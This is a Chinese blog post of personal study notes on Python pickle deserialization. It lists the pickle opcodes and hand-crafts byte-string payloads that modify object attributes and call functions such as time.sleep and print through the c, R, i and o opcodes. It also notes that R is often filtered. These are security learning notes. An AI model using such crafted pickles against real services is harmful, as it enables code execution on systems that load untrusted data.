

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
    <meta name="description" content="pickle反序列化的一些学习">
<meta property="og:type" content="article">
<meta property="og:title" content="pickle反序列化学习">
<meta property="og:url" content="https://xianbeil.github.io/2022/02/22/pickle/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="pickle反序列化的一些学习">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://o.130014.xyz/2022/02/22/image-20220222112451-q81gntp.png">
<meta property="article:published_time" content="2022-02-22T10:04:17.000Z">
<meta property="article:modified_time" content="2022-04-22T10:40:43.904Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="python反序列化">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://o.130014.xyz/2022/02/22/image-20220222112451-q81gntp.png">
  
  
  
  <title>pickle反序列化学习 - Hexo</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"xianbeil.github.io","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>

  
<meta name="generator" content="Hexo 6.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Fluid</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="pickle反序列化学习"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-02-22 18:04" pubdate>
          2022年2月22日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          21k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          176 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">pickle反序列化学习</h1>
            
            <div class="markdown-body">
              
              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自己学习pickle反序列化整理的笔记（个人向</p>
<h1 id="pickle库"><a href="#pickle库" class="headerlink" title="pickle库"></a>pickle库</h1><p>pickle 序列化就是将一个 python 对象变成可以持久化储存的二进制数据，反序列化即为相反的操作，将二进制数据转回 python 对象。</p>
<h2 id="学习基础的pickle-opcode-v0"><a href="#学习基础的pickle-opcode-v0" class="headerlink" title="学习基础的pickle opcode(v0)"></a>学习基础的pickle opcode(v0)</h2><p>速查：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span><br><span class="hljs-comment"># here is in kind-of alphabetical order of 1-character pickle code.</span><br><span class="hljs-comment"># pickletools groups them by purpose.</span><br><br>MARK           = <span class="hljs-string">b&#x27;(&#x27;</span>   <span class="hljs-comment"># push special markobject on stack</span><br>STOP           = <span class="hljs-string">b&#x27;.&#x27;</span>   <span class="hljs-comment"># every pickle ends with STOP</span><br>POP            = <span class="hljs-string">b&#x27;0&#x27;</span>   <span class="hljs-comment"># discard topmost stack item</span><br>POP_MARK       = <span class="hljs-string">b&#x27;1&#x27;</span>   <span class="hljs-comment"># discard stack top through topmost markobject</span><br>DUP            = <span class="hljs-string">b&#x27;2&#x27;</span>   <span class="hljs-comment"># duplicate top stack item</span><br>FLOAT          = <span class="hljs-string">b&#x27;F&#x27;</span>   <span class="hljs-comment"># push float object; decimal string argument</span><br>INT            = <span class="hljs-string">b&#x27;I&#x27;</span>   <span class="hljs-comment"># push integer or bool; decimal string argument</span><br>BININT         = <span class="hljs-string">b&#x27;J&#x27;</span>   <span class="hljs-comment"># push four-byte signed int</span><br>BININT1        = <span class="hljs-string">b&#x27;K&#x27;</span>   <span class="hljs-comment"># push 1-byte unsigned int</span><br>LONG           = <span class="hljs-string">b&#x27;L&#x27;</span>   <span class="hljs-comment"># push long; decimal string argument</span><br>BININT2        = <span class="hljs-string">b&#x27;M&#x27;</span>   <span class="hljs-comment"># push 2-byte unsigned int</span><br>NONE           = <span class="hljs-string">b&#x27;N&#x27;</span>   <span class="hljs-comment"># push None</span><br>PERSID         = <span class="hljs-string">b&#x27;P&#x27;</span>   <span class="hljs-comment"># push persistent object; id is taken from string arg</span><br>BINPERSID      = <span class="hljs-string">b&#x27;Q&#x27;</span>   <span class="hljs-comment">#  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span><br>REDUCE         = <span class="hljs-string">b&#x27;R&#x27;</span>   <span class="hljs-comment"># apply callable to argtuple, both on stack</span><br>STRING         = <span class="hljs-string">b&#x27;S&#x27;</span>   <span class="hljs-comment"># push string; NL-terminated string argument</span><br>BINSTRING      = <span class="hljs-string">b&#x27;T&#x27;</span>   <span class="hljs-comment"># push string; counted binary string argument</span><br>SHORT_BINSTRING= <span class="hljs-string">b&#x27;U&#x27;</span>   <span class="hljs-comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span><br>UNICODE        = <span class="hljs-string">b&#x27;V&#x27;</span>   <span class="hljs-comment"># push Unicode string; raw-unicode-escaped&#x27;d argument</span><br>BINUNICODE     = <span class="hljs-string">b&#x27;X&#x27;</span>   <span class="hljs-comment">#   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span><br>APPEND         = <span class="hljs-string">b&#x27;a&#x27;</span>   <span class="hljs-comment"># append stack top to list below it</span><br>BUILD          = <span class="hljs-string">b&#x27;b&#x27;</span>   <span class="hljs-comment"># call __setstate__ or __dict__.update()</span><br>GLOBAL         = <span class="hljs-string">b&#x27;c&#x27;</span>   <span class="hljs-comment"># push self.find_class(modname, name); 2 string args</span><br>DICT           = <span class="hljs-string">b&#x27;d&#x27;</span>   <span class="hljs-comment"># build a dict from stack items</span><br>EMPTY_DICT     = <span class="hljs-string">b&#x27;&#125;&#x27;</span>   <span class="hljs-comment"># push empty dict</span><br>APPENDS        = <span class="hljs-string">b&#x27;e&#x27;</span>   <span class="hljs-comment"># extend list on stack by topmost stack slice</span><br>GET            = <span class="hljs-string">b&#x27;g&#x27;</span>   <span class="hljs-comment"># push item from memo on stack; index is string arg</span><br>BINGET         = <span class="hljs-string">b&#x27;h&#x27;</span>   <span class="hljs-comment">#   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span><br>INST           = <span class="hljs-string">b&#x27;i&#x27;</span>   <span class="hljs-comment"># build &amp; push class instance</span><br>LONG_BINGET    = <span class="hljs-string">b&#x27;j&#x27;</span>   <span class="hljs-comment"># push item from memo on stack; index is 4-byte arg</span><br>LIST           = <span class="hljs-string">b&#x27;l&#x27;</span>   <span class="hljs-comment"># build list from topmost stack items</span><br>EMPTY_LIST     = <span class="hljs-string">b&#x27;]&#x27;</span>   <span class="hljs-comment"># push empty list</span><br>OBJ            = <span class="hljs-string">b&#x27;o&#x27;</span>   <span class="hljs-comment"># build &amp; push class instance</span><br>PUT            = <span class="hljs-string">b&#x27;p&#x27;</span>   <span class="hljs-comment"># store stack top in memo; index is string arg</span><br>BINPUT         = <span class="hljs-string">b&#x27;q&#x27;</span>   <span class="hljs-comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span><br>LONG_BINPUT    = <span class="hljs-string">b&#x27;r&#x27;</span>   <span class="hljs-comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span><br>SETITEM        = <span class="hljs-string">b&#x27;s&#x27;</span>   <span class="hljs-comment"># add key+value pair to dict</span><br>TUPLE          = <span class="hljs-string">b&#x27;t&#x27;</span>   <span class="hljs-comment"># build tuple from topmost stack items</span><br>EMPTY_TUPLE    = <span class="hljs-string">b&#x27;)&#x27;</span>   <span class="hljs-comment"># push empty tuple</span><br>SETITEMS       = <span class="hljs-string">b&#x27;u&#x27;</span>   <span class="hljs-comment"># modify dict by adding topmost key+value pairs</span><br>BINFLOAT       = <span class="hljs-string">b&#x27;G&#x27;</span>   <span class="hljs-comment"># push float; arg is 8-byte float encoding</span><br><br>TRUE           = <span class="hljs-string">b&#x27;I01\n&#x27;</span>  <span class="hljs-comment"># not an opcode; see INT docs in pickletools.py</span><br>FALSE          = <span class="hljs-string">b&#x27;I00\n&#x27;</span>  <span class="hljs-comment"># not an opcode; see INT docs in pickletools.py</span><br><br><span class="hljs-comment"># Protocol 2</span><br><br>PROTO          = <span class="hljs-string">b&#x27;\x80&#x27;</span>  <span class="hljs-comment"># identify pickle protocol</span><br>NEWOBJ         = <span class="hljs-string">b&#x27;\x81&#x27;</span>  <span class="hljs-comment"># build object by applying cls.__new__ to argtuple</span><br>EXT1           = <span class="hljs-string">b&#x27;\x82&#x27;</span>  <span class="hljs-comment"># push object from extension registry; 1-byte index</span><br>EXT2           = <span class="hljs-string">b&#x27;\x83&#x27;</span>  <span class="hljs-comment"># ditto, but 2-byte index</span><br>EXT4           = <span class="hljs-string">b&#x27;\x84&#x27;</span>  <span class="hljs-comment"># ditto, but 4-byte index</span><br>TUPLE1         = <span class="hljs-string">b&#x27;\x85&#x27;</span>  <span class="hljs-comment"># build 1-tuple from stack top</span><br>TUPLE2         = <span class="hljs-string">b&#x27;\x86&#x27;</span>  <span class="hljs-comment"># build 2-tuple from two topmost stack items</span><br>TUPLE3         = <span class="hljs-string">b&#x27;\x87&#x27;</span>  <span class="hljs-comment"># build 3-tuple from three topmost stack items</span><br>NEWTRUE        = <span class="hljs-string">b&#x27;\x88&#x27;</span>  <span class="hljs-comment"># push True</span><br>NEWFALSE       = <span class="hljs-string">b&#x27;\x89&#x27;</span>  <span class="hljs-comment"># push False</span><br>LONG1          = <span class="hljs-string">b&#x27;\x8a&#x27;</span>  <span class="hljs-comment"># push long from &lt; 256 bytes</span><br>LONG4          = <span class="hljs-string">b&#x27;\x8b&#x27;</span>  <span class="hljs-comment"># push really big long</span><br><br>_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]<br><br><span class="hljs-comment"># Protocol 3 (Python 3.x)</span><br><br>BINBYTES       = <span class="hljs-string">b&#x27;B&#x27;</span>   <span class="hljs-comment"># push bytes; counted binary string argument</span><br>SHORT_BINBYTES = <span class="hljs-string">b&#x27;C&#x27;</span>   <span class="hljs-comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span><br><br><span class="hljs-comment"># Protocol 4</span><br><br>SHORT_BINUNICODE = <span class="hljs-string">b&#x27;\x8c&#x27;</span>  <span class="hljs-comment"># push short string; UTF-8 length &lt; 256 bytes</span><br>BINUNICODE8      = <span class="hljs-string">b&#x27;\x8d&#x27;</span>  <span class="hljs-comment"># push very long string</span><br>BINBYTES8        = <span class="hljs-string">b&#x27;\x8e&#x27;</span>  <span class="hljs-comment"># push very long bytes string</span><br>EMPTY_SET        = <span class="hljs-string">b&#x27;\x8f&#x27;</span>  <span class="hljs-comment"># push empty set on the stack</span><br>ADDITEMS         = <span class="hljs-string">b&#x27;\x90&#x27;</span>  <span class="hljs-comment"># modify set by adding topmost stack items</span><br>FROZENSET        = <span class="hljs-string">b&#x27;\x91&#x27;</span>  <span class="hljs-comment"># build frozenset from topmost stack items</span><br>NEWOBJ_EX        = <span class="hljs-string">b&#x27;\x92&#x27;</span>  <span class="hljs-comment"># like NEWOBJ but work with keyword only arguments</span><br>STACK_GLOBAL     = <span class="hljs-string">b&#x27;\x93&#x27;</span>  <span class="hljs-comment"># same as GLOBAL but using names on the stacks</span><br>MEMOIZE          = <span class="hljs-string">b&#x27;\x94&#x27;</span>  <span class="hljs-comment"># store top of the stack in memo</span><br>FRAME            = <span class="hljs-string">b&#x27;\x95&#x27;</span>  <span class="hljs-comment"># indicate the beginning of a new frame</span><br><br><span class="hljs-comment"># Protocol 5</span><br><br>BYTEARRAY8       = <span class="hljs-string">b&#x27;\x96&#x27;</span>  <span class="hljs-comment"># push bytearray</span><br>NEXT_BUFFER      = <span class="hljs-string">b&#x27;\x97&#x27;</span>  <span class="hljs-comment"># push next out-of-band buffer</span><br>READONLY_BUFFER  = <span class="hljs-string">b&#x27;\x98&#x27;</span>  <span class="hljs-comment"># make top of stack readonly</span><br></code></pre></td></tr></table></figure>

<p><strong>换行符</strong>代表参数的结束</p>
<p>( 为压入一个 mark object，用以构建 tuple、list 等对象或调用函数时标识数据的<strong>开始位置</strong></p>
<p>. 为每个 pickle 序列化数据都必须有的结束标识符</p>
<p> I为压入整数，接收一个整数参数，其后跟一个换行符表示参数结束</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>pickle.loads(<span class="hljs-string">b&#x27;I12345\n.&#x27;</span>)<br><span class="hljs-number">12345</span><br></code></pre></td></tr></table></figure>

<p>0 执行 POP 操作，1 针对 mark object 执行 POP 操作，2 复制栈顶元素，即将栈顶元素再次入栈</p>
<p>d l t 分别从栈中数据创建 dict、list、tuple 对象，以 mark object 标识数据开始，并会将数据和 mark object 从栈中移除</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">data2 = <span class="hljs-string">b&quot;&quot;&quot;(S&#x27;a&#x27;</span><br><span class="hljs-string">S&#x27;b&#x27;</span><br><span class="hljs-string">S&#x27;c&#x27;</span><br><span class="hljs-string">S&#x27;d&#x27;</span><br><span class="hljs-string">t.&quot;&quot;&quot;</span><br><br>(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>)<br><br>    <span class="hljs-number">0</span>: (    MARK<br>    <span class="hljs-number">1</span>: S        STRING     <span class="hljs-string">&#x27;a&#x27;</span><br>    <span class="hljs-number">6</span>: S        STRING     <span class="hljs-string">&#x27;b&#x27;</span><br>   <span class="hljs-number">11</span>: S        STRING     <span class="hljs-string">&#x27;c&#x27;</span><br>   <span class="hljs-number">16</span>: S        STRING     <span class="hljs-string">&#x27;d&#x27;</span><br>   <span class="hljs-number">21</span>: t        TUPLE      (MARK at <span class="hljs-number">0</span>)<br>   <span class="hljs-number">22</span>: .    STOP<br>highest protocol among opcodes = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>

<p><code>&#125;</code> <code>]</code> <code>)</code> 分别将空 dict、空 list、空 tuple对象压入栈中，后续可以使用其它方法对这些对象进行操作</p>
<p><code>s</code> 将栈顶的两个元素以 key-value 的格式放入其后的 dict 中，对应 <code>dict[key]=value</code> 操作</p>
<p><code>u</code> 为添加多个 key-value，操作与 <code>d</code> 类似</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">data3 = <span class="hljs-string">b&quot;&quot;&quot;&#125;S&#x27;a&#x27;</span><br><span class="hljs-string">S&#x27;b&#x27;</span><br><span class="hljs-string">s.&quot;&quot;&quot;</span><br><br>&#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-string">&#x27;b&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>

<p><code>a</code> 将栈顶元素放入其后的 list 中，对应 <code>list.append(value)</code> 操作</p>
<p><code>e</code> 为添加多个元素，操作与 <code>l</code> 类似</p>
<p><code>b</code> 用于修改栈中的对象，调用对应类设定的 <code>__setstate__</code> 函数 (若有) 或默认的 <code>__dict__.update</code> 来修改对象的元素，栈顶为调用 update 的参数，需要一个 dict 参数，后一个元素为对应修改的对象</p>
<p>修改对象属性：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.a = <span class="hljs-number">0</span><br><br>a = A()<br>data4 = <span class="hljs-string">b&quot;&quot;&quot;c__main__</span><br><span class="hljs-string">a</span><br><span class="hljs-string">(S&#x27;a&#x27;</span><br><span class="hljs-string">I1</span><br><span class="hljs-string">db.&quot;&quot;&quot;</span><br>pickle.loads(data4)<br><span class="hljs-built_in">print</span>(a.a)<br><br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<blockquote>
<pre><code class="hljs">0: c    GLOBAL     &#39;__main__ a&#39;  
12: (    MARK  
13: S        STRING     &#39;a&#39;  
18: I        INT        1  
21: d        DICT       (MARK at 12)  
22: b    BUILD  
23: .    STOP  
highest protocol among opcodes = 0&lt;br /&gt;

c	push self.find_class(modname, name);

这里是用c find到了对象a

然后b调用函数来修改对象中的属性，因为要求传入一个dict所以调用d，上面压入的是两个参数

栈底是要修改的对象a，栈顶是传入的参数，很好理解
</code></pre>
</blockquote>
<p><code>c</code> 为最常见的 opcode 之一，其作用可以归结为调用 <code>find_class</code> 方法并将结果入栈，其接收两个参数，第一个参数为 <code>modname</code>，第二个参数为 <code>name</code></p>
<ul>
<li><code>p</code> <code>q</code> <code>r</code> 将栈顶的元素放入 memo (一个临时使用的内存) 中，其接收一个参数，为该元素在 memo 中的索引，区别在于索引的类型不同<br><code>g</code> <code>h</code> <code>j</code> 与之相对应，接收一个参数作为索引，在 memo 中寻找该索引对应的元素放入栈顶<br>这三对 opcode 一般用于弹出或修改非栈顶元素时，将栈顶元素临时保存</li>
</ul>
<p><code>R</code> 为最常被过滤的 opcode，其由特殊方法 <strong>reduce</strong> 产生，对栈顶的 tuple 进行 callable 操作，第一个元素为一个可调用的对象 (一般通过 c 获取)，第二个元素为一个 tuple 储存调用的参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">data = <span class="hljs-string">b&quot;&quot;&quot;ctime</span><br><span class="hljs-string">sleep</span><br><span class="hljs-string">(I5</span><br><span class="hljs-string">tp0</span><br><span class="hljs-string">R.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>pickle.loads(data)<br><br>等效于time.sleep(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure>

<p><code>i</code> <code>o</code> 均用于创建类的实例，也可用于调用方法，其区别在于使用方法和参数传递方法的不同</p>
<p><code>i</code> 接收两个参数 (在 opcode 后跟参数)，分别对应 <code>modname</code> 与 <code>name</code>，创建实例或调用方法所用参数为使用 <code>i</code> 时栈内内容，以 mark object 标识数据开始</p>
<p>创建对象：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,a,b</span>):<br>        self.a = a<br>        self.b = b<br><br>data1 = <span class="hljs-string">b&quot;&quot;&quot;(S&#x27;aaa&#x27;</span><br><span class="hljs-string">S&#x27;bbb&#x27;</span><br><span class="hljs-string">i__main__</span><br><span class="hljs-string">A</span><br><span class="hljs-string">.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-built_in">print</span>(pickle.loads(data1).a)<br></code></pre></td></tr></table></figure>

<p>调用方法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">data2 = <span class="hljs-string">b&quot;&quot;&quot;(S&#x27;hello&#x27;</span><br><span class="hljs-string">S&#x27;world&#x27;</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">print</span><br><span class="hljs-string">.&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure>

<p><code>o</code> 不接收参数，其使用栈上的元素，以 mark object 标识数据开始，<strong>第一个元素为类或可调用的对象</strong>，之后的元素为其参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">data3 = <span class="hljs-string">b&quot;&quot;&quot;(c__main__</span><br><span class="hljs-string">A</span><br><span class="hljs-string">S&#x27;aaa&#x27;</span><br><span class="hljs-string">S&#x27;bbb&#x27;</span><br><span class="hljs-string">o.&quot;&quot;&quot;</span><br><span class="hljs-built_in">print</span>(pickle.loads(data3).a)<br><br>data4 = <span class="hljs-string">b&quot;&quot;&quot;(c__builtin__</span><br><span class="hljs-string">print</span><br><span class="hljs-string">S&#x27;aaa&#x27;</span><br><span class="hljs-string">S&#x27;bbb&#x27;</span><br><span class="hljs-string">S&#x27;ccc&#x27;</span><br><span class="hljs-string">o.&quot;&quot;&quot;</span><br>pickle.loads(data4)<br></code></pre></td></tr></table></figure>

<h2 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h2><p>pickle.loads是一个供我们调用的接口。其底层实现是基于_Unpickler类。</p>
<p><img src="https://o.130014.xyz/2022/02/22/image-20220222112451-q81gntp.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<pre><code class="hljs">栈是unpickle机最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：当前栈专注于维护最顶层的信息，而前序栈维护下层的信息。这两个栈区的操作过程将在讨论MASK指令时解释。

